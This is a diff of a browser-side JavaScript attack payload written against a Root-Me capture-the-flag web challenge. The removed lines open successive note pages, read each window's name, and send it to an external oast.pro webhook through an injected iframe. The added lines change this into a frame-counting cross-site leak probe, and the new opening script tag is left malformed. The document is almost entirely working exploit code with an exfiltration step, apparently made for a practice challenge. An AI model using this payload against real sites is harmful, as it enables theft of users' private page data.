@@ -1,23 +1,24 @@
-<script>
+<script
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
-const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
-let i = 1400
 
-function next() {
+function test(i) {
     const w = window.open(TARGET + i);
 
     setTimeout(() => {
-        const data = w.name;
+        let frames;
 
-        const ex = document.createElement("iframe");
-        ex.src = WEBHOOK + "?id=" + i + "&d=" + encodeURIComponent(data);
-        document.documentElement.appendChild(ex);
+        try {
+            frames = w.length;
+        } catch (e) {
+            frames = -1;
+        }
+
+        console.log("ID:", i, "frames:", frames);
 
         w.close();
-        i++;
-        next();
     }, 1000);
 }
 
-next();
+test(1479);
+test(1480);
 </script>
